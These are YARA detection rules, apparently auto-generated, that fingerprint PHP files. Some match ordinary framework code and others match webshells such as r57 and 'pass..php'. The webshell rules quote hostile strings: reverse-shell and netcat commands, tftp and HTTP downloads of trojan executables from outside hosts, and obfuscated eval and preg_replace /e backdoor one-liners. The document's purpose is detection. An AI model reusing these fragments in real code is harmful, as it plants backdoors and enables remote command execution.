      $s1 = "// the IV client to server is the hash of that \"nonce\" with the letter A and for the encryption key it's the letter " fullword ascii
      $s2 = "* function. eg. maybe you have a better source of entropy for creating the initial states or whatever." fullword ascii
      $s3 = "* PHP 5.3.2) with fallback implementation for earlier PHP versions." fullword ascii
      $s4 = "* Wrapper around stream_resolve_include_path() (which was introduced in" fullword ascii
      $s5 = "user_error('crypt_random_string requires at least one symmetric cipher be loaded');" fullword ascii
      $s6 = "* The idea behind this function is that it can be easily replaced with your own crypt_random_string()" fullword ascii
      $s7 = "// http://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator#Designs_based_on_cryptographi" fullword ascii
      $s8 = "* @return mixed Filename (string) on success, false otherwise." fullword ascii
      $s9 = "$i = $crypto->encrypt(microtime()); // strlen(microtime()) == 21" fullword ascii
      $s10 = "* Resolve filename against the include path." fullword ascii
      $s11 = "$ds = substr($prefix, -1) == DIRECTORY_SEPARATOR ? '' : DIRECTORY_SEPARATOR;" fullword ascii
      $s12 = "// surprisingly slower than method 2. maybe that's because mcrypt_create_iv does a bunch of error checking that we'r" fullword ascii
      $s13 = "preg_split('#(?<!phar):#', get_include_path()) :" fullword ascii
      $s14 = "$v = $crypto->encrypt($r ^ $i); // strlen($r) == 20" fullword ascii
      $s15 = "$r = $crypto->encrypt($i ^ $v); // strlen($v) == 20" fullword ascii
      $s16 = "// however, a ton of people visiting the website. obviously you don't want to base your seeding" fullword ascii
      $s17 = "* @copyright 2007 Jim Wigginton" fullword ascii
      $s18 = "explode(PATH_SEPARATOR, get_include_path());" fullword ascii
      $s19 = "if (!function_exists('phpseclib_resolve_include_path')) {" fullword ascii
      $s20 = "// path's specified in include_path don't always end in /" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule ProductVariantGenerationTypeExtension
{
   meta:
      description = "php22 - file ProductVariantGenerationTypeExtension.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f01d7442238bafeb760bf1659530a7cf4373b789e7a14380f1530e62f86fc9c5"
   strings:
      $s1 = "$builder->addEventListener(FormEvents::PRE_SET_DATA, function (FormEvent $event): void {" fullword ascii
      $s2 = "$event->getForm()->add('channelPricings', ChannelCollectionType::class, [" fullword ascii
      $s3 = "public function getExtendedType(): string" fullword ascii
      $s4 = "$productVariant = $event->getData();" fullword ascii
      $s5 = "public function buildForm(FormBuilderInterface $builder, array $options): void" fullword ascii
      $s6 = "use Sylius\\Bundle\\ProductBundle\\Form\\Type\\ProductVariantGenerationType;" fullword ascii
      $s7 = "use Sylius\\Component\\Core\\Model\\ChannelInterface;" fullword ascii
      $s8 = "use Sylius\\Bundle\\CoreBundle\\Form\\Type\\Product\\ChannelPricingType;" fullword ascii
      $s9 = "use Symfony\\Component\\Form\\FormBuilderInterface;" fullword ascii
      $s10 = "use Symfony\\Component\\Form\\AbstractTypeExtension;" fullword ascii
      $s11 = "'entry_options' => function (ChannelInterface $channel) use ($productVariant) {" fullword ascii
      $s12 = "use Sylius\\Bundle\\CoreBundle\\Form\\Type\\ChannelCollectionType;" fullword ascii
      $s13 = "use Symfony\\Component\\Form\\FormEvents;" fullword ascii
      $s14 = "use Symfony\\Component\\Form\\FormEvent;" fullword ascii
      $s15 = "namespace Sylius\\Bundle\\CoreBundle\\Form\\Extension;" fullword ascii
      $s16 = "final class ProductVariantGenerationTypeExtension extends AbstractTypeExtension" fullword ascii
      $s17 = "'product_variant' => $productVariant," fullword ascii
      $s18 = "'label' => 'sylius.form.variant.price'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule RelationUserTrait
{
   meta:
      description = "php22 - file RelationUserTrait.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "86850e37fecaf2eb1c2e254ea759de74ebd7f0fd7c63b53bb2234c1c2c79bc3c"
   strings:
      $s1 = "* @return \\Illuminate\\Database\\Eloquent\\Relations\\BelongsTo" fullword ascii
      $s2 = "use Someline\\Models\\Foundation\\User;" fullword ascii
      $s3 = "return $this->belongsTo(User::class, 'user_id', 'user_id');" fullword ascii
      $s4 = "<?php namespace Someline\\Models\\Traits;" fullword ascii
      $s5 = "public function user()" fullword ascii
      $s6 = "trait RelationUserTrait" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PersistentCollection
{
   meta:
      description = "php22 - file PersistentCollection.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "16e59488ec0b3aa0251183d3394a5749a7b5e77a47feeede84fe9583b5a50bee"
   strings:
      $s1 = "$this->values = unserialize(file_get_contents($this->file));" fullword ascii
      $s2 = "file_put_contents($this->file, serialize($this->values));" fullword ascii
      $s3 = "/* (c) Anton Medvedev <anton@medv.io>" fullword ascii
      $s4 = "public function __construct(string $file, array $collection = [])" fullword ascii
      $s5 = "parent::__construct($collection);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}


rule ResetPasswordCommand
{
   meta:
      description = "php22 - file ResetPasswordCommand.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a6246d31342fcb8c111dfa1a00cff94b71ef7a3d9e81a38a5e2dd353bd60245d"
   strings:
      $x1 = "'Plaintext password - if not set, script will prompt for the new password (recommended)'" fullword ascii
      $s2 = "$this->output->writeln('Password for user ' . $user->getName() . ' reset successfully.');" fullword ascii
      $s3 = "protected function execute(InputInterface $input, OutputInterface $output)" fullword ascii
      $s4 = "$question = new Question('Please enter the new password: ');" fullword ascii
      $s5 = "$password = Authentication::getPasswordHash($user->getName(), $plainPassword);" fullword ascii
      $s6 = "protected function askForPassword(InputInterface $input, OutputInterface $output)" fullword ascii
      $s7 = "class ResetPasswordCommand extends AbstractCommand" fullword ascii
      $s8 = "$plainPassword = $input->getOption('password');" fullword ascii
      $s9 = "if ($input->getOption('password')) {" fullword ascii
      $s10 = "$this->writeError('User with name/ID ' . $userArgument . ' could not be found. Exiting');" fullword ascii
      $s11 = "->setDescription(\"Reset a user's password\")" fullword ascii
      $s12 = "$plainPassword = $this->askForPassword($input, $output);" fullword ascii
      $s13 = "$method = is_numeric($userArgument) ? 'getById' : 'getByName';" fullword ascii
      $s14 = "$password = $helper->ask($input, $output, $question);" fullword ascii
      $s15 = "namespace Pimcore\\Bundle\\CoreBundle\\Command;" fullword ascii
      $s16 = "->setName('pimcore:user:reset-password')" fullword ascii
      $s17 = "$userArgument = $input->getArgument('user');" fullword ascii
      $s18 = "use Pimcore\\Console\\AbstractCommand;" fullword ascii
      $s19 = "->setAliases(['reset-password'])" fullword ascii
      $s20 = "$user->setPassword($password);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      1 of ($x*) and 4 of them
}

rule php22_offline
{
   meta:
      description = "php22 - file offline.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c6858fd94275aadd82f2cf5591f35c6fe5c3d83e19b716a0b730efc5c723a96d"
   strings:
      $x1 = "* @author    RocketTheme http://www.rockettheme.com" fullword ascii
      $s2 = "* @copyright Copyright (C) 2007 - 2017 RocketTheme, LLC" fullword ascii
      $s3 = "* http://www.gnu.org/licenses/gpl-2.0.html" fullword ascii
      $s4 = "// Bootstrap Gantry framework or fail gracefully (inside included file)." fullword ascii
      $s5 = "'message' => substr($html, $start, $end - $start)" fullword ascii
      $s6 = "/** @var \\Gantry\\Framework\\Theme $theme */" fullword ascii
      $s7 = "include JPATH_THEMES . '/system/offline.php';" fullword ascii
      $s8 = "$gantry = include __DIR__ . '/includes/gantry.php';" fullword ascii
      $s9 = "$start = strpos($html, '<body>') + 6;" fullword ascii
      $s10 = "$html = ob_get_clean();" fullword ascii
      $s11 = "* @license   GNU/GPLv2 and later" fullword ascii
      $s12 = "unset($gantry['configuration']);" fullword ascii
      $s13 = "// Reset used outline configuration." fullword ascii
      $s14 = "* @package   Gantry 5 Theme" fullword ascii
      $s15 = "$end = strpos($html, '</body>', $start);" fullword ascii
      $s16 = "->render('offline.html.twig', $context);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule php22_pass_
{
   meta:
      description = "php22 - file pass..php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4dca1ebe61a0ef001a37ec63e4ea20ca59ba0e30af9fa0dc9ee676ed12373bc5"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x4 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x5 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x6 = "if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $x7 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x9 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x10 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x11 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x12 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x13 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x14 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x15 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x16 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x17 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $x18 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';" fullword ascii
      $x19 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $x20 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*)
}

rule RegexValidator
{
   meta:
      description = "php22 - file RegexValidator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a79c29929b629e60a83180fe0869384ffd5aff23bae7861171ba371fd2c08f5f"
   strings:
      $s1 = "* @throws \\InvalidArgumentException Invalid mixed value type passed." fullword ascii
      $s2 = "if ($error && $message = $this->getErrorString(self::E_DOES_NOT_MATCH, $mixed)) {" fullword ascii
      $s3 = "throw new \\RuntimeException(sprintf('Regex Error: %i', preg_last_error()));" fullword ascii
      $s4 = "* @param \\ArrayAccess|null $error" fullword ascii
      $s5 = "throw new \\InvalidArgumentException('\\Concrete\\Core\\Validator\\String\\TooShortValidator only validates string length'" fullword ascii
      $s6 = "throw new \\InvalidArgumentException('\\Concrete\\Core\\Validator\\String\\TooShortValidator only validates string length');" fullword ascii
      $s7 = "'RegexError: String \\\"%s\\\" does not match expected pattern.'," fullword ascii
      $s8 = "$this->setErrorString(self::E_DOES_NOT_MATCH, function ($validator, $code, $mixed) {" fullword ascii
      $s9 = "* @throws \\RuntimeException         Invalid regex pattern." fullword ascii
      $s10 = "$result = @preg_match($this->getPattern(), $mixed);" fullword ascii
      $s11 = "* RegexValidator constructor." fullword ascii
      $s12 = "/** Passed string doesn't match */" fullword ascii
      $s13 = "* Is this mixed value valid." fullword ascii
      $s14 = "public function isValid($mixed, \\ArrayAccess $error = null)" fullword ascii
      $s15 = "use Concrete\\Core\\Validator\\AbstractTranslatableValidator;" fullword ascii
      $s16 = "$this->setRequirementString(self::E_DOES_NOT_MATCH, 'Must match pattern.');" fullword ascii
      $s17 = "/** @var string Regex pattern */" fullword ascii
      $s18 = "namespace Concrete\\Core\\Validator\\String;" fullword ascii
      $s19 = "$error[] = $message;" fullword ascii
      $s20 = "* @param mixed             $mixed Can be any value" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule PipeStdinInStdoutStdErrStreamSelect
{
   meta:
      description = "php22 - file PipeStdinInStdoutStdErrStreamSelect.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fc549609137056d113f69fe9e522d2da008aaef17fa8b09efb7c31f5e9c44151"
   strings:
      $s1 = "$written = fwrite(STDOUT, (binary) $out, 32768);" fullword ascii
      $s2 = "$written = fwrite(STDERR, (binary) $err, 32768);" fullword ascii
      $s3 = "define('ERR_READ_FAILED', 3);" fullword ascii
      $s4 = "die(ERR_READ_FAILED);" fullword ascii
      $s5 = "$err = (binary) substr($err, $written);" fullword ascii
      $s6 = "$out = (binary) substr($out, $written);" fullword ascii
      $s7 = "if (false === $str || feof(STDIN)) {" fullword ascii
      $s8 = "if (null === $read && '' === $err) {" fullword ascii
      $s9 = "if (null === $read && '' === $out) {" fullword ascii
      $s10 = "$str = fread(STDIN, 32768);" fullword ascii
      $s11 = "define('ERR_WRITE_FAILED', 4);" fullword ascii
      $s12 = "define('ERR_SELECT_FAILED', 1);" fullword ascii
      $s13 = "stream_set_blocking(STDIN, 0);" fullword ascii
      $s14 = "while ($read || $write) {" fullword ascii
      $s15 = "$write = array_diff($write, array(STDERR));" fullword ascii
      $s16 = "$write = array_diff($write, array(STDOUT));" fullword ascii
      $s17 = "$read = array(STDIN);" fullword ascii
      $s18 = "if (!feof(STDIN)) {" fullword ascii
      $s19 = "if (in_array(STDOUT, $w) && strlen($out) > 0) {" fullword ascii
      $s20 = "if (in_array(STDERR, $w) && strlen($err) > 0) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule recaptcha_helper
{
   meta:
      description = "php22 - file recaptcha_helper.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9086b775884e9039fdbce66097c10fc17fed25927f655a87fd5115568f3b6245"
   strings:
      $s1 = "\"you can do so at <a href='http://www.google.com/recaptcha/mailhide/apikey'>http://www.google.com/recaptcha/mailhide/apikey" fullword ascii
      $s2 = "die (\"To use reCAPTCHA you must get an API key from <a href='https://www.google.com/recaptcha/admin/create'>https://www.google." ascii
      $s3 = "function recaptcha_get_html ($pubkey, $error = null, $use_ssl)" fullword ascii
      $s4 = "return \"https://www.google.com/recaptcha/admin/create?\" .  _recaptcha_qsencode (array ('domains' => $domain, 'app' => $appname" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      all of them
}

rule PasswordResetModel
{
   meta:
      description = "php22 - file PasswordResetModel.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e2e8e8d5c1dbb538e4e1ec875c4900a1d48d985a057efc0cac0ba4001a131c17"
   strings:
      $x1 = "$body = Config::get('EMAIL_PASSWORD_RESET_CONTENT') . ' ' . Config::get('URL') ." fullword ascii
      $x2 = "* Please note: At this point the user has already pre-verified via verifyPasswordReset() (within one hour)," fullword ascii
      $x3 = "Session::add('feedback_negative', Text::get('FEEDBACK_PASSWORD_RESET_MAIL_SENDING_ERROR') . $mail->getError() );" fullword ascii
      $x4 = "Config::get('EMAIL_PASSWORD_RESET_URL') . '/' . urlencode($user_name) . '/' . urlencode($user_password_reset_has" fullword ascii
      $x5 = "Config::get('EMAIL_PASSWORD_RESET_URL') . '/' . urlencode($user_name) . '/' . urlencode($user_password_reset_hash);" fullword ascii
      $x6 = "Config::get('EMAIL_PASSWORD_RESET_FROM_NAME'), Config::get('EMAIL_PASSWORD_RESET_SUBJECT'), $body" fullword ascii
      $x7 = "* Handles all the stuff that is related to the password-reset process" fullword ascii
      $x8 = "public static function setPasswordResetDatabaseToken($user_name, $user_password_reset_hash, $temporary_timestamp)" fullword ascii
      $x9 = "$mail_sent = $mail->sendMail($user_email, Config::get('EMAIL_PASSWORD_RESET_FROM_EMAIL')," fullword ascii
      $x10 = "$token_set = self::setPasswordResetDatabaseToken($result->user_name, $user_password_reset_hash, $temporary_timestamp);" fullword ascii
      $s11 = "Session::add('feedback_negative', Text::get('FEEDBACK_PASSWORD_RESET_COMBINATION_DOES_NOT_EXIST'));" fullword ascii
      $s12 = "Session::add('feedback_negative', Text::get('FEEDBACK_PASSWORD_NEW_SAME_AS_CURRENT'));" fullword ascii
      $s13 = "$sql = \"SELECT user_password_hash, user_failed_logins FROM users WHERE user_name = :user_name LIMIT 1;\";" fullword ascii
      $s14 = "Session::add('feedback_negative', Text::get('FEEDBACK_PASSWORD_RESET_TOKEN_FAIL'));" fullword ascii
      $s15 = "Session::add('feedback_negative', Text::get('FEEDBACK_PASSWORD_CHANGE_FAILED'));" fullword ascii
      $s16 = "Session::add('feedback_positive', Text::get('FEEDBACK_PASSWORD_RESET_MAIL_SENDING_SUCCESSFUL'));" fullword ascii
      $s17 = "* Set the new password (for DEFAULT user, FACEBOOK-users don't have a password)" fullword ascii
      $s18 = "':user_password_reset_timestamp' => $temporary_timestamp, ':provider_type' => 'DEFAULT'" fullword ascii
      $s19 = "* Set password reset token in database (for DEFAULT user accounts)" fullword ascii
      $s20 = "* Verifies the password reset request via the verification hash token (that's only valid for one hour)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      1 of ($x*) and all of them
}

rule php_shell_create_function
{
   meta:
      description = "php22 - file php-shell-create_function.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "937b85ac68624f417070f0f63cfb4c900e95894766ab248be43322654c26ec5b"
   strings:
      $s1 = "$function = create_function('$code',strrev('lave').'('.strrev('TEG_$').'[\"code\"]);');" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}

rule perspectives_example
{
   meta:
      description = "php22 - file perspectives.example.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e1bf122bac6523f0ff4cd3b4c4a3cc29addc07127e34e19a79f388f9b900a69e"
   strings:
      $s1 = "'icon' => '/pimcore/static6/img/flat-color-icons/biohazard.svg'," fullword ascii
      $s2 = "'dashboards' => [                                  // this is the standard setting for the welcome screen" fullword ascii
      $s3 = "'sort' => -3                                    // trees with lower values are shown first" fullword ascii
      $s4 = "'default' => [                                              // this is the config for the default view" fullword ascii
      $s5 = "'welcome' => [                             // internal key of the dashboard" fullword ascii
      $s6 = "'type' => 'pimcore.layout.portlets.modifiedAssets'," fullword ascii
      $s7 = "'type' => 'pimcore.layout.portlets.modifiedDocuments'," fullword ascii
      $s8 = "'type' => 'pimcore.layout.portlets.modifiedObjects'," fullword ascii
      $s9 = "'disabledPortlets' => [                        // disallows access to the given portlets" fullword ascii
      $s10 = "'pimcore.layout.portlets.feed' => 1" fullword ascii
      $s11 = "'id' => 2,                                      // show alternative document tree on the right side" fullword ascii
      $s12 = "'position' => 'right',                                      // show the asset tree on the right side" fullword ascii
      $s13 = "'position' => 'left',                                      // show the asset tree on the right side" fullword ascii
      $s14 = "'sort' => -10,                                  // show it on the top" fullword ascii
      $s15 = "'icon' => '/pimcore/static6/img/flat-color-icons/webcam.svg'," fullword ascii
      $s16 = "'type' => 'pimcore.layout.portlets.modificationStatistic'," fullword ascii
      $s17 = "'treeContextMenu' => [                          // hide the \"Add document\" tree context menu" fullword ascii
      $s18 = "'marketing' => [                                                // hide the marketing menu" fullword ascii
      $s19 = "'pimcore.layout.portlets.modificationStatistic' => 1," fullword ascii
      $s20 = "'iconCls' => 'pimcore_icon_perspective'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule php22_Offer
{
   meta:
      description = "php22 - file Offer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a5e30ed034dd12be03e54c41f346cc8d0f263a9dabc31d0fcbf123dc7e322e06"
   strings:
      $s1 = "$xpath->registerNamespace('az', 'http://webservices.amazon.com/AWSECommerceService/2005-10-05');" fullword ascii
      $s2 = "* @version    $Id: Offer.php 20096 2010-01-06 02:05:09Z bkarwin $" fullword ascii
      $s3 = "$this->CurrencyCode = (string) $xpath->query('./az:OfferListing/az:Price/az:CurrencyCode/text()', $dom)->item(0)->data;" fullword ascii
      $s4 = "$this->OfferListingId = (string) $xpath->query('./az:OfferListing/az:OfferListingId/text()', $dom)->item(0)->data;" fullword ascii
      $s5 = "$this->CurrencyCode = (string) $xpath->query('./az:OfferListing/az:Price/az:CurrencyCode/text()', $dom)->item(0)->da" fullword ascii
      $s6 = "$this->Condition = (string) $xpath->query('./az:OfferAttributes/az:Condition/text()', $dom)->item(0)->data;" fullword ascii
      $s7 = "$this->Price = (int) $xpath->query('./az:OfferListing/az:Price/az:Amount/text()', $dom)->item(0)->data;" fullword ascii
      $s8 = "$this->GlancePage = (string) $xpath->query('./az:Merchant/az:GlancePage/text()', $dom)->item(0)->data;" fullword ascii
      $s9 = "$this->MerchantId = (string) $xpath->query('./az:Merchant/az:MerchantId/text()', $dom)->item(0)->data;" fullword ascii
      $s10 = "* @param  DOMElement $dom" fullword ascii
      $s11 = "$result = $xpath->query('./az:OfferListing/az:IsEligibleForSuperSaverShipping/text()', $dom);" fullword ascii
      $s12 = "$this->IsEligibleForSuperSaverShipping = (bool) $result->item(0)->data;" fullword ascii
      $s13 = "* Parse the given Offer element" fullword ascii
      $s14 = "$availability = $xpath->query('./az:OfferListing/az:Availability/text()', $dom)->item(0);" fullword ascii
      $s15 = "* @subpackage Amazon" fullword ascii
      $s16 = "public $IsEligibleForSuperSaverShipping = false;" fullword ascii
      $s17 = "* @package    Zend_Service" fullword ascii
      $s18 = "$Price = $xpath->query('./az:OfferListing/az:Price/az:Amount', $dom);" fullword ascii
      $s19 = "$this->Availability = (string) $availability->data;" fullword ascii
      $s20 = "public function __construct(DOMElement $dom)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      8 of them
}

rule r57_Shell
{
   meta:
      description = "php22 - file r57_Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d0819e45f7c6acf3bd0b8dcf49ee4f3ba4edd152038a84043752eea3f04afa39"
   strings:
      $s1 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\"))" fullword ascii
      $s2 = "/* --- END datapipe.pl ----------------------------------------------------------------------------------------- */" fullword ascii
      $s3 = "/* --- END datapipe.c ------------------------------------------------------------------------------------------ */" fullword ascii
      $s4 = "/* --- Port bind source PERL ----------------------------------------------------------------------------------- */" fullword ascii
      $s5 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s6 = "/* --- Port bind source C -------------------------------------------------------------------------------------- */" fullword ascii
      $s7 = "/* --- END Port bind source PERL ------------------------------------------------------------------------------- */" fullword ascii
      $s8 = "$_POST['cmd']= $p2.\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s9 = "/* --- END Port bind source C ---------------------------------------------------------------------------------- */" fullword ascii
      $s10 = "/* --- datapipe.c ---------------------------------------------------------------------------------------------- */" fullword ascii
      $s11 = "/* --- datapipe.pl --------------------------------------------------------------------------------------------- */" fullword ascii
      $s12 = "$_POST['cmd']= $p2.\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s13 = "/* --- Back connect source PERL -------------------------------------------------------------------------------- */" fullword ascii
      $s14 = "/* --- Back connect source C ----------------------------------------------------------------------------------- */" fullword ascii
      $s15 = "/* --- END Back connect source PERL ---------------------------------------------------------------------------- */" fullword ascii
      $s16 = "/* --- END Back connect source C ------------------------------------------------------------------------------- */" fullword ascii
      $s17 = "echo (!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"));" fullword ascii
      $s18 = "echo \"<input type=text name=s_dir size=85 value=\".$dir.\"> * ( /root;/home;/tmp )<br>\";" fullword ascii
      $s19 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s20 = "} // end if ($_POST['cmd']==\"mysql_dump\")" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}


rule OrderTokenAssignerInterface
{
   meta:
      description = "php22 - file OrderTokenAssignerInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e3a40ce85b563942dfe8b2c76a4e2e716e0d81092f640a753a22af7d824e16e1"
   strings:
      $s1 = "namespace Sylius\\Component\\Core\\TokenAssigner;" fullword ascii
      $s2 = "public function assignTokenValueIfNotSet(OrderInterface $order): void;" fullword ascii
      $s3 = "* @param OrderInterface $order" fullword ascii
      $s4 = "public function assignTokenValue(OrderInterface $order): void;" fullword ascii
      $s5 = "interface OrderTokenAssignerInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ProductTranslationTypeExtension
{
   meta:
      description = "php22 - file ProductTranslationTypeExtension.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "25cdc0ddbaaae0bf5209a38bcda8882cc8f2242fc6681fb002cfbfad4922c53c"
   strings:
      $s1 = "use Symfony\\Component\\Form\\Extension\\Core\\Type\\TextareaType;" fullword ascii
      $s2 = "public function getExtendedType(): string" fullword ascii
      $s3 = "public function buildForm(FormBuilderInterface $builder, array $options): void" fullword ascii
      $s4 = "use Symfony\\Component\\Form\\FormBuilderInterface;" fullword ascii
      $s5 = "use Symfony\\Component\\Form\\AbstractTypeExtension;" fullword ascii
      $s6 = "'label' => 'sylius.form.product.short_description'," fullword ascii
      $s7 = "use Sylius\\Bundle\\ProductBundle\\Form\\Type\\ProductTranslationType;" fullword ascii
      $s8 = "namespace Sylius\\Bundle\\CoreBundle\\Form\\Extension;" fullword ascii
      $s9 = "final class ProductTranslationTypeExtension extends AbstractTypeExtension" fullword ascii
      $s10 = "->add('shortDescription', TextareaType::class, [" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}


rule php22_qiang6
{
   meta:
      description = "php22 - file qiang6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f665b4198708e0af8a85bc0a51d4392a9ba7a2883306e4886184fe6b5c714d26"
   strings:
      $s1 = "$hh(\"/[discuz]/e\",$_POST['h'],\"Access\");" fullword ascii
      $s2 = "$hh = \"p\".\"r\".\"e\".\"g\".\"_\".\"r\".\"e\".\"p\".\"l\".\"a\".\"c\".\"e\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_r57
{
   meta:
      description = "php22 - file r57.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
   strings:
      $x1 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x2 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii
      $x3 = "$b = \"evilc0der.com\"; //need hits \"shell created by evilc0ders\"" fullword ascii
      $x4 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s5 = "$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\\'t change dir on ftp server');" fullword ascii
      $s6 = "/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ???? ???????  ?? ??????? ????? ???????" fullword ascii
      $s7 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s8 = "@readfile (\"http://127.0.0.1/r57shell/version.php?version=\".$current_version.\"\");}}  " fullword ascii
      $s9 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s10 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s11 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s12 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s13 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s14 = "'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd'," fullword ascii
      $s15 = "'eng_text101'=>'Use reverse (user -> resu) login for password'," fullword ascii
      $s16 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
